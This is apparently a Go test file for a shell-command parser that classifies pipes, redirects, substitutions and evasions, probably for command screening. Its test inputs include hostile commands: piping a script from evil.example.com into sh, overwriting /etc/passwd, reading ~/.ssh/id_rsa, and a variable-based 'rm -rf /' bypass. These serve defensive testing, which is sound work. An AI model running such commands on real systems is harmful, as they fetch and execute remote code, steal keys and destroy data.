package shellparse

import (
	"strings"
	"testing"
)

func TestParse_SimpleCommand(t *testing.T) {
	p, err := Parse("ls -la /tmp")
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(p.Calls) != 1 {
		t.Fatalf("want 1 call, got %d", len(p.Calls))
	}
	c := p.Calls[0]
	if c.Program != "ls" {
		t.Errorf("Program = %q", c.Program)
	}
	if !equal(c.Args, []string{"-la", "/tmp"}) {
		t.Errorf("Args = %v", c.Args)
	}
	if !equal(c.Flags, []string{"-la"}) {
		t.Errorf("Flags = %v", c.Flags)
	}
	if !equal(c.Positional, []string{"/tmp"}) {
		t.Errorf("Positional = %v", c.Positional)
	}
	if c.HasUnresolved {
		t.Error("should be fully resolved")
	}
	if p.Features.HasPipe || p.Features.HasRedirect || p.Features.HasCmdSub {
		t.Errorf("unexpected features: %+v", p.Features)
	}
}

func TestParse_Pipeline(t *testing.T) {
	p, err := Parse("cat /etc/hosts | grep -v '#' | head -5")
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if !p.Features.HasPipe {
		t.Error("HasPipe should be true")
	}
	if len(p.Calls) != 3 {
		t.Errorf("want 3 calls, got %d: %+v", len(p.Calls), p.Calls)
	}
	if len(p.Pipelines) != 1 {
		t.Fatalf("want 1 pipeline, got %d", len(p.Pipelines))
	}
	progs := []string{}
	for _, c := range p.Pipelines[0] {
		progs = append(progs, c.Program)
	}
	if !equal(progs, []string{"cat", "grep", "head"}) {
		t.Errorf("pipeline programs = %v", progs)
	}
}

func TestParse_CurlPipeSh(t *testing.T) {
	p, err := Parse("curl -sL https://evil.example.com/x.sh | sh")
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if !p.Features.HasPipe {
		t.Error("HasPipe should be true")
	}
	if len(p.Pipelines) != 1 || len(p.Pipelines[0]) != 2 {
		t.Fatalf("want 1 pipeline with 2 calls, got %+v", p.Pipelines)
	}
	if p.Pipelines[0][0].Program != "curl" || p.Pipelines[0][1].Program != "sh" {
		t.Errorf("pipeline = %v,%v", p.Pipelines[0][0].Program, p.Pipelines[0][1].Program)
	}
}

func TestParse_Redirect(t *testing.T) {
	p, err := Parse("echo evil > /etc/passwd")
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if !p.Features.HasRedirect {
		t.Error("HasRedirect should be true")
	}
	if len(p.Calls) != 1 || p.Calls[0].Program != "echo" {
		t.Errorf("calls = %+v", p.Calls)
	}
}

func TestParse_CommandSubstitution(t *testing.T) {
	p, err := Parse(`rm $(find /tmp -name "*.log")`)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if !p.Features.HasCmdSub {
		t.Error("HasCmdSub should be true")
	}
	// The outer rm should be captured; the inner find should also be captured
	// (walkthrough hits nested CallExprs via syntax.Walk? Actually our collector
	// doesn't recurse into CmdSubst. Verify: only outer rm is in Calls.)
	var progs []string
	for _, c := range p.Calls {
		progs = append(progs, c.Program)
	}
	if len(p.Calls) < 1 || p.Calls[0].Program != "rm" {
		t.Errorf("calls = %v", progs)
	}
	// The rm call's first arg comes from $(...) which is unresolvable.
	if !p.Calls[0].HasUnresolved {
		t.Errorf("outer rm should have HasUnresolved=true because arg is $(...)")
	}
}

func TestParse_ProcessSubstitution(t *testing.T) {
	p, err := Parse("bash <(curl -sL https://evil.example.com/x.sh)")
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if !p.Features.HasProcSub {
		t.Error("HasProcSub should be true")
	}
	// bash should appear as a call
	found := false
	for _, c := range p.Calls {
		if c.Program == "bash" {
			found = true
		}
	}
	if !found {
		t.Error("expected bash call")
	}
}

func TestParse_Subshell(t *testing.T) {
	p, err := Parse("(cd /tmp && rm -rf foo)")
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if !p.Features.HasSubshell {
		t.Error("HasSubshell should be true")
	}
	// Both cd and rm should be captured with Nesting == NestSubshell.
	var programs []string
	for _, c := range p.Calls {
		programs = append(programs, c.Program)
		if c.Nesting != NestSubshell {
			t.Errorf("%s: Nesting = %d, want NestSubshell", c.Program, c.Nesting)
		}
	}
	if !contains(programs, "cd") || !contains(programs, "rm") {
		t.Errorf("programs = %v", programs)
	}
}

func TestParse_MultipleStatements(t *testing.T) {
	p, err := Parse("ls /tmp; cat /etc/hosts; grep -r foo .")
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if !p.Features.HasMultiStmt {
		t.Error("HasMultiStmt should be true")
	}
	if !p.Features.HasBinaryOp {
		t.Error("HasBinaryOp should be true for ;")
	}
	if len(p.Calls) != 3 {
		t.Errorf("want 3 calls, got %d", len(p.Calls))
	}
}

func TestParse_AssignmentThenCommand(t *testing.T) {
	// The classic bypass attempt: R=rm; $R -rf /
	// The second statement has program = ParamExp → HasUnresolved.
	p, err := Parse("R=rm; $R -rf /")
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	// First statement is an assignment-only (no CallExpr Args[0]).
	// Second statement's call has program = unresolved $R.
	var unresolvedCount int
	for _, c := range p.Calls {
		if c.HasUnresolved {
			unresolvedCount++
		}
	}
	if unresolvedCount == 0 {
		t.Errorf("expected at least one unresolved call; got calls = %+v", p.Calls)
	}
}

func TestParse_DoubleQuotedWithVar(t *testing.T) {
	// `cat "$HOME/.ssh/id_rsa"` — HOME var inside double quotes → unresolved.
	p, err := Parse(`cat "$HOME/.ssh/id_rsa"`)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(p.Calls) != 1 {
		t.Fatalf("want 1 call, got %d", len(p.Calls))
	}
	if p.Calls[0].Program != "cat" {
		t.Errorf("Program = %q", p.Calls[0].Program)
	}
	if !p.Calls[0].HasUnresolved {
		t.Error("should be HasUnresolved because of $HOME inside double quotes")
	}
}

func TestParse_SingleQuoted(t *testing.T) {
	// Single-quoted strings don't expand — they're literal.
	p, err := Parse(`grep -r 'TODO:' src/`)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(p.Calls) != 1 {
		t.Fatalf("want 1 call, got %d", len(p.Calls))
	}
	c := p.Calls[0]
	if c.HasUnresolved {
		t.Error("single-quoted should be fully resolved")
	}
	if !contains(c.Args, "TODO:") {
		t.Errorf("Args = %v", c.Args)
	}
}

func TestParse_AbsolutePath(t *testing.T) {
	p, err := Parse("/bin/rm -rf /tmp/junk")
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if p.Calls[0].Program != "/bin/rm" {
		t.Errorf("Program = %q", p.Calls[0].Program)
	}
}

func TestParse_SudoCommand(t *testing.T) {
	p, err := Parse("sudo apt-get install -y vim")
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if p.Calls[0].Program != "sudo" {
		t.Errorf("Program = %q", p.Calls[0].Program)
	}
	// Args after sudo are apt-get, install, -y, vim
	if len(p.Calls[0].Args) < 4 {
		t.Errorf("Args = %v", p.Calls[0].Args)
	}
}

func TestParse_GitPushForce(t *testing.T) {
	p, err := Parse("git push --force origin main")
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	c := p.Calls[0]
	if c.Program != "git" {
		t.Errorf("Program = %q", c.Program)
	}
	if !contains(c.Flags, "--force") {
		t.Errorf("Flags = %v, want --force", c.Flags)
	}
	if !contains(c.Positional, "push") || !contains(c.Positional, "origin") || !contains(c.Positional, "main") {
		t.Errorf("Positional = %v", c.Positional)
	}
}

func TestParse_NewlineInjection(t *testing.T) {
	// "ls\nrm -rf /" — two statements, the second is rm.
	p, err := Parse("ls\nrm -rf /tmp/x")
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if !p.Features.HasMultiStmt {
		t.Error("HasMultiStmt should be true")
	}
	var progs []string
	for _, c := range p.Calls {
		progs = append(progs, c.Program)
	}
	if !equal(progs, []string{"ls", "rm"}) {
		t.Errorf("progs = %v", progs)
	}
}

func TestParse_ConditionalChain(t *testing.T) {
	p, err := Parse("test -f /tmp/x && cat /tmp/x || echo missing")
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if !p.Features.HasBinaryOp {
		t.Error("HasBinaryOp should be true")
	}
	var progs []string
	for _, c := range p.Calls {
		progs = append(progs, c.Program)
	}
	// Expect test, cat, echo
	if !contains(progs, "test") || !contains(progs, "cat") || !contains(progs, "echo") {
		t.Errorf("progs = %v", progs)
	}
}

func TestParse_Empty(t *testing.T) {
	if _, err := Parse(""); err == nil {
		t.Error("expected error for empty command")
	}
	if _, err := Parse("   "); err == nil {
		t.Error("expected error for whitespace-only command")
	}
}

func TestParse_MalformedShell(t *testing.T) {
	// Unclosed quote — should return error, not panic.
	if _, err := Parse(`echo "unterminated`); err == nil {
		t.Error("expected parse error for unterminated quote")
	}
}

func TestParse_RealWorldCommands(t *testing.T) {
	// Real payloads captured during Phase 0 probe.
	samples := []string{
		`find /Users/robin/Documents/code/einstein -type f -name "*.php" | grep -i "shift\|enum" | head -30`,
		`curl -s -o /dev/null -w "health: %{http_code}\n" -m 3 http://localhost:8090/health; echo "---retry trigger---"; rm -f /tmp/trig.json`,
		`sqlite3 -line .data/sitegen.db "SELECT id, status, substr(error,1,800) as error FROM playbook_runs WHERE id=226;" 2>&1`,
	}
	for _, s := range samples {
		if _, err := Parse(s); err != nil {
			t.Errorf("failed to parse real-world command: %v\n  cmd: %s", err, s)
		}
	}
}

// --- helpers ---

func equal(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func contains(s []string, want string) bool {
	for _, v := range s {
		if v == want {
			return true
		}
	}
	return false
}

// Sanity: make sure Raw is preserved.
func TestParse_RawPreserved(t *testing.T) {
	in := "ls -la /tmp"
	p, err := Parse(in)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if p.Raw != in {
		t.Errorf("Raw = %q, want %q", p.Raw, in)
	}
}

// Smoke test: Features are consistent with the raw string
func TestParse_FeatureSmokeTest(t *testing.T) {
	cases := []struct {
		cmd  string
		want Features
	}{
		{"ls -la", Features{}},
		{"a | b", Features{HasPipe: true}},
		{"a > /tmp/x", Features{HasRedirect: true}},
		{"(a)", Features{HasSubshell: true}},
		{`a $(b)`, Features{HasCmdSub: true}},
		{"bash <(a)", Features{HasProcSub: true}},
		{"a; b", Features{HasMultiStmt: true, HasBinaryOp: true}},
		{"a && b", Features{HasBinaryOp: true}},
	}
	for _, tc := range cases {
		t.Run(tc.cmd, func(t *testing.T) {
			p, err := Parse(tc.cmd)
			if err != nil {
				t.Fatal(err)
			}
			// Only check the fields explicitly set in want.
			if tc.want.HasPipe && !p.Features.HasPipe {
				t.Errorf("HasPipe expected")
			}
			if tc.want.HasRedirect && !p.Features.HasRedirect {
				t.Errorf("HasRedirect expected")
			}
			if tc.want.HasSubshell && !p.Features.HasSubshell {
				t.Errorf("HasSubshell expected")
			}
			if tc.want.HasCmdSub && !p.Features.HasCmdSub {
				t.Errorf("HasCmdSub expected")
			}
			if tc.want.HasProcSub && !p.Features.HasProcSub {
				t.Errorf("HasProcSub expected")
			}
			if tc.want.HasMultiStmt && !p.Features.HasMultiStmt {
				t.Errorf("HasMultiStmt expected")
			}
			if tc.want.HasBinaryOp && !p.Features.HasBinaryOp {
				t.Errorf("HasBinaryOp expected")
			}
		})
	}
	_ = strings.TrimSpace("") // keep strings import until used elsewhere
}
